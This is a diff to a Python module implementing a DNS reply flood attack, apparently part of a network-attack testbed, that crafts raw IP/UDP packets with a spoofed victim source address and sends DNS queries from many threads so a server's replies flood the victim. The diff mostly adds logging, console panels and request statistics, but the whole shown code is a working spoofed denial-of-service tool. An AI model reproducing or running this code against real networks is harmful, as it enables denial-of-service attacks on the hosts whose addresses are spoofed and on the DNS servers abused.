@@ -5,16 +5,20 @@ import struct
 import random
 import time
 import threading
-import string
+import logging
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from attack.attack_strategy import AttackStrategy
 
-current_dir = os.path.dirname(os.path.abspath(__file__))
-if current_dir not in sys.path:
-    sys.path.insert(0, current_dir)
+console = Console()
 
-try:
-    from attack_strategy import AttackStrategy
-except ImportError:
-    from .attack_strategy import AttackStrategy
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    handlers=[logging.StreamHandler()],
+)
+
 
 """
 DNS Reply Flood Attack Implementation
@@ -110,6 +114,16 @@ NS-3 STYLE PACKET CONSTRUCTION DETAILS:
 
 """
 
+dns_query_type_dict = {
+    1: "A",
+    28: "AAAA",
+    15: "MX",
+    5: "CNAME",
+    2: "NS",
+    16: "TXT",
+}
+
+
 class DNSReplyFlood(AttackStrategy):
     def __init__(
         self,
@@ -122,38 +136,77 @@ class DNSReplyFlood(AttackStrategy):
         zone_file_path=None,
         valid_domains=None,
         query_types=None,
+        log_file=None,
     ):
         super().__init__(server_ip, server_port, duration, threads)
+        self.server_ip = server_ip
+        self.server_port = server_port
         self.spoofed_ip = target_ip
         self.spoofed_port = target_port
         self.zone_file_path = zone_file_path or os.path.join(
-            os.path.dirname(__file__), '../dns_server/zones/primary.zone')
+            os.path.dirname(__file__), "../dns_server/zones/primary.zone"
+        )
         self.legit_domains = self._load_zone_domains()
         self.valid_domains = valid_domains or [
-            "google.com", "facebook.com", "twitter.com", "github.com",
-            "stackoverflow.com", "microsoft.com", "amazon.com"
+            "google.com",
+            "facebook.com",
+            "twitter.com",
+            "github.com",
+            "stackoverflow.com",
+            "microsoft.com",
+            "amazon.com",
         ]
-        self.query_types = query_types or [1, 28, 15, 5, 2, 16]  # A, AAAA, MX, CNAME, NS, TXT
+        self.query_types = query_types or [
+            1,
+            28,
+            15,
+            5,
+            2,
+            16,
+        ]  # A, AAAA, MX, CNAME, NS, TXT
+
+        # Setup file logger (decoupled from console logger)
+        log_path = log_file if log_file else "./dns_reply_flood_attack.log"
+        self.file_logger = logging.getLogger("DNS_REPLY_FLOOD_FILE")
+        self.file_logger.setLevel(logging.INFO)
+        fh = logging.FileHandler(log_path)
+        fh.setFormatter(
+            logging.Formatter("[%(asctime)s] %(name)s - %(levelname)s - %(message)s")
+        )
+        # Remove all handlers before adding
+        self.file_logger.handlers.clear()
+        self.file_logger.addHandler(fh)
+        # Prevent propagation to root logger (so file logs don't show in console)
+        self.file_logger.propagate = False
+
+        # Setup console logger (for progress only)
+        self.console_logger = logging.getLogger("DNS_REPLY_FLOOD_CONSOLE")
+        self.console_logger.setLevel(logging.INFO)
+        self.console_logger.handlers.clear()
+        ch = logging.StreamHandler()
+        ch.setFormatter(logging.Formatter("%(message)s"))
+        self.console_logger.addHandler(ch)
+        # Prevent propagation to root logger (so console logs don't show in file)
+        self.console_logger.propagate = False
 
     def _load_zone_domains(self):
         domains = []
         try:
-            with open(self.zone_file_path, 'r') as f:
+            with open(self.zone_file_path, "r") as f:
                 for line in f:
                     line = line.strip()
-                    if not line or line.startswith('$'):
+                    if not line or line.startswith("$"):
                         continue
                     parts = line.split()
                     if len(parts) >= 1:
                         domain = parts[0]
-                        if domain.endswith('.'):
+                        if domain.endswith("."):
                             domain = domain[:-1]
                         domains.append(domain)
         except Exception as e:
-            self.logger.warning(f"Could not load zone file: {e}")
+            console.print(f"[yellow]Could not load zone file: {e}[/yellow]")
+            self.file_logger.warning(f"Could not load zone file: {e}")
         return domains
-
-    # Removed _generate_random_subdomain
 
     def _pick_query_domain(self):
         r = random.random()
@@ -192,12 +245,9 @@ class DNSReplyFlood(AttackStrategy):
         return question
 
     def _create_dns_query_packet(self, domain, qtype=1):
-        dns_header, transaction_id = self._create_dns_header()
+        dns_header, _ = self._create_dns_header()
         dns_question = self._create_dns_question(domain, qtype)
         dns_packet = dns_header + dns_question
-        self.logger.debug(
-            f"Created DNS query for {domain} (type {qtype}), size: {len(dns_packet)} bytes, TXN ID: {transaction_id}"
-        )
         return dns_packet
 
     def _create_ip_header(self, source_ip, dest_ip, total_length):
@@ -244,11 +294,15 @@ class DNSReplyFlood(AttackStrategy):
         checksum_data = pseudo_header + udp_header + udp_data
         return self.checksum(checksum_data)
 
-    def _create_complete_packet(self, source_ip, dest_ip, source_port, dest_port, dns_packet):
+    def _create_complete_packet(
+        self, source_ip, dest_ip, source_port, dest_port, dns_packet
+    ):
         udp_length = 8 + len(dns_packet)
         total_length = 20 + udp_length
         udp_header = self._create_udp_header(source_port, dest_port, udp_length)
-        udp_checksum = self._calculate_udp_checksum(source_ip, dest_ip, udp_header, dns_packet)
+        udp_checksum = self._calculate_udp_checksum(
+            source_ip, dest_ip, udp_header, dns_packet
+        )
         udp_header = struct.pack(
             "!HHHH", source_port, dest_port, udp_length, udp_checksum
         )
@@ -267,12 +321,23 @@ class DNSReplyFlood(AttackStrategy):
             sock.sendto(complete_packet, (self.target_ip, 0))
             sock.close()
             self.packets_sent += 1
-            self.logger.debug(
-                f"Sent DNS query for {domain} from spoofed {spoofed_ip}:{spoofed_port}"
-            )
+            # Log DNS request to file only
+            req_info = {
+                "timestamp": time.time(),
+                "query_name": domain,
+                "query_type": qtype,
+                "spoofed_ip": spoofed_ip,
+                "spoofed_port": spoofed_port,
+            }
+            self.metrics["dns_requests"].append(req_info)
+            msg = f"Sent DNS query: {domain} (type {dns_query_type_dict[qtype]}) from {spoofed_ip}:{spoofed_port}"
+            self.file_logger.info(msg)
             return True
         except Exception as e:
-            self.logger.error(f"Error sending DNS query: {e}")
+            err_msg = f"Error sending DNS query: {e}"
+            # Only print errors to console
+            console.print(f"[red]{err_msg}[/red]")
+            self.file_logger.error(err_msg)
             return False
 
     def _check_privileges(self):
@@ -290,78 +355,183 @@ class DNSReplyFlood(AttackStrategy):
         return threads
 
     def _dns_flood_worker(self):
-        thread_id = threading.current_thread().ident
-        self.logger.debug(f"DNS reply flood worker thread {thread_id} started")
         while self.attack_active:
             try:
                 domain = self._pick_query_domain()
                 qtype = random.choice(self.query_types)
                 spoofed_port = random.randint(1024, 65535)
-                self.logger.debug(
-                    f"Thread {thread_id}: Querying {domain} (type {qtype}) from spoofed {self.spoofed_ip}:{spoofed_port}"
-                )
                 self._send_dns_query(self.spoofed_ip, spoofed_port, domain, qtype)
                 time.sleep(0.01)
             except Exception as e:
-                self.logger.error(f"Error in DNS reply flood worker thread {thread_id}: {e}")
+                err_msg = f"Error in DNS reply flood worker thread: {e}"
+                console.print(f"[red]{err_msg}[/red]")
+                self.file_logger.error(err_msg)
                 continue
-        self.logger.debug(f"DNS reply flood worker thread {thread_id} stopped")
 
     def _monitor_attack_progress(self, start_time):
         try:
             while time.time() - start_time < self.duration:
                 elapsed = time.time() - start_time
                 rate = self.packets_sent / elapsed if elapsed > 0 else 0
-                rate_color = self._get_rate_color(rate)
-                progress_msg = f"Elapsed: {elapsed:.1f}s | DNS Queries: {self.packets_sent} | Rate: {rate:.1f} qps"
-                self._print_colored(f"\r{progress_msg}", rate_color, end="")
-                if int(elapsed) % 10 == 0 and int(elapsed) > 0:
-                    self.logger.info(f"DNS reply flood attack progress - {progress_msg}")
+
+                if rate < 100:
+                    level = "[green]LOW[/green]"
+                elif rate < 1000:
+                    level = "[yellow]MEDIUM[/yellow]"
+                else:
+                    level = "[red]HIGH[/red]"
+
+                progress_msg = (
+                    f"Rate: {rate:.1f} qps [{level}] | "
+                    f"Total sent: [bold cyan]{self.packets_sent:,}[/bold cyan] | "
+                    f"Elapsed: [yellow]{elapsed:.1f}s[/yellow]"
+                )
+                # Clear console line and update
+                console.print(f"\r{progress_msg}", end="\r")
                 time.sleep(1)
         except KeyboardInterrupt:
-            self._print_warning("\nDNS reply flood attack interrupted by user")
-            self.logger.warning("DNS reply flood attack interrupted by user")
+            console.print(
+                "\n[yellow]🛑 DNS reply flood attack interrupted by user[/yellow]"
+            )
+            self.file_logger.warning("DNS reply flood attack interrupted by user")
+
+    def log_dns_request_stats(self):
+        """Log meaningful stats from metrics['dns_requests'] instead of dumping the array."""
+        requests = self.metrics.get("dns_requests", [])
+        total = len(requests)
+        if total == 0:
+            self.file_logger.info("DNS_REQUEST_STATS - No DNS requests recorded.")
+            return
+
+        # Unique domains and query types
+        domain_counts = {}
+        type_counts = {}
+        for req in requests:
+            domain = req.get("query_name")
+            qtype = req.get("query_type")
+            domain_counts[domain] = domain_counts.get(domain, 0) + 1
+            type_counts[qtype] = type_counts.get(qtype, 0) + 1
+
+        unique_domains = len(domain_counts)
+        unique_types = len(type_counts)
+        top_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[
+            :5
+        ]
+        top_types = sorted(type_counts.items(), key=lambda x: x[1], reverse=True)
+
+        self.file_logger.info(f"DNS_REQUEST_STATS - Total requests: {total}")
+        self.file_logger.info(f"DNS_REQUEST_STATS - Unique domains: {unique_domains}")
+        self.file_logger.info(f"DNS_REQUEST_STATS - Unique query types: {unique_types}")
+        self.file_logger.info(
+            f"DNS_REQUEST_STATS - Top 5 queried domains: {top_domains}"
+        )
+        self.file_logger.info(
+            f"DNS_REQUEST_STATS - Query type counts: {[(dns_query_type_dict.get(t, t), c) for t, c in top_types]}"
+        )
 
     def attack(self):
-        self._display_attack_header()
-        self.logger.info(
-            f"Starting DNS Reply Flood attack on {self.target_ip}:{self.target_port}, spoofing {self.spoofed_ip}:{self.spoofed_port}"
-        )
-        self.logger.info(
-            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
-        )
-        self.logger.info(
-            f"Legit domains: {len(self.legit_domains)}, Valid domains: {len(self.valid_domains)}, Query types: {len(self.query_types)}"
-        )
-        self.logger.info(
-            "IP SPOOFING ENABLED: Using target IP as spoofed source for each query"
-        )
+        self._print_attack_header()
+        self._log_attack_parameters()
         if not self._check_privileges():
             return
+
         self.attack_active = True
         start_time = time.time()
-        self._print_header("Starting DNS reply flood attack threads...")
+        self.metrics["start_time"] = start_time
+
         threads = self._start_worker_threads()
-        self._print_success(f"✓ {self.threads} DNS reply flood worker threads started")
-        self._print_info("DNS Reply Flood in progress... Press Ctrl+C to stop")
+        self._print_worker_threads_started()
+        self._print_attack_in_progress()
+
         self._monitor_attack_progress(start_time)
         self.attack_active = False
-        self._print_info("\nStopping DNS reply flood attack threads...")
+
+        self._stop_worker_threads(threads)
+        end_time = time.time()
+        self._summarize_attack(start_time, end_time)
+        self.log_dns_request_stats()
+
+    def _print_attack_header(self):
+        header_text = (
+            f"[bold red]DNS REPLY FLOOD ATTACK INITIATED[/bold red]\n"
+            f"[bold white]Server:[/bold white] [yellow]{self.server_ip}:{self.server_port}[/yellow]\n"
+            f"[bold white]Target:[/bold white] [yellow]{self.spoofed_ip}:{self.spoofed_port}[/yellow]\n"
+            f"[bold white]Duration:[/bold white] [yellow]{self.duration} seconds[/yellow]\n"
+            f"[bold white]Threads:[/bold white] [yellow]{self.threads}[/yellow]"
+        )
+        console.print(
+            Panel.fit(header_text, title="DNS Reply Flood", border_style="magenta")
+        )
+
+    def _log_attack_parameters(self):
+        self.file_logger.info(
+            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
+        )
+        self.file_logger.info(
+            f"Legit domains: {len(self.legit_domains)}, Valid domains: {len(self.valid_domains)}, Query types: {len(self.query_types)}"
+        )
+        self.file_logger.info(
+            "IP SPOOFING ENABLED: Using target IP as spoofed source for each query"
+        )
+
+    def _print_worker_threads_started(self):
+        console.print(
+            f"[bold green]✓ {self.threads} DNS reply flood worker threads started[/bold green]"
+        )
+
+    def _print_attack_in_progress(self):
+        console.print(
+            "[blue]DNS Reply Flood in progress... Press Ctrl+C to stop[/blue]"
+        )
+
+    def _stop_worker_threads(self, threads):
+        console.print(
+            "\n[bold red]Stopping DNS reply flood attack threads...[/bold red]"
+        )
         for thread in threads:
             thread.join(timeout=1)
-        self._display_attack_completion(start_time)
 
-if __name__ == "__main__":
-    import logging
-    logging.basicConfig(
-        level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
-    )
-    # Example usage:
-    server_ip = "127.0.0.1"  # DNS server IP
-    server_port = 53
-    target_ip = "192.168.1.100"  # Spoofed victim IP
-    target_port = 12345
-    attack = DNSReplyFlood(
-        server_ip, server_port, target_ip, target_port, duration=10, threads=5
-    )
-    attack.attack()
+    def _summarize_attack(self, start_time, end_time):
+        duration_sec = end_time - start_time
+        total_packets = self.packets_sent
+        avg_rate = total_packets / duration_sec if duration_sec > 0 else 0
+
+        self.metrics["end_time"] = end_time
+        self.metrics["total_packets"] = total_packets
+        self.metrics["avg_rate"] = avg_rate
+
+        if total_packets >= 10000:
+            packet_color = "green"
+        elif total_packets >= 1000:
+            packet_color = "yellow"
+        else:
+            packet_color = "red"
+        if avg_rate >= 1000:
+            rate_color = "green"
+        elif avg_rate >= 100:
+            rate_color = "yellow"
+        else:
+            rate_color = "red"
+
+        summary_table = Table.grid(padding=(0, 2))
+        summary_table.add_column(justify="left")
+        summary_table.add_column(justify="right")
+        summary_table.add_row(
+            "[bold white]📦 Total Packets Sent[/bold white]",
+            f"[{packet_color}]{total_packets:,}[/{packet_color}]",
+        )
+        summary_table.add_row("[bold white]⏱️  Duration[/bold white]", f"[cyan]{duration_sec:.2f} seconds[/cyan]")
+        summary_table.add_row(
+            "[bold white]🚀 Average Rate[/bold white]",
+            f"[{rate_color}]{avg_rate:.2f} packets/sec[/{rate_color}]",
+        )
+
+        summary_panel = Panel.fit(
+            summary_table,
+            title="[bold green]DNS REPLY FLOOD COMPLETED[/bold green]",
+            border_style="cyan",
+        )
+        console.print(summary_panel)
+        self.file_logger.info(
+            f"Attack completed. Packets: {total_packets}, Time: {duration_sec:.2f}s, Rate: {avg_rate:.2f} pps"
+        )
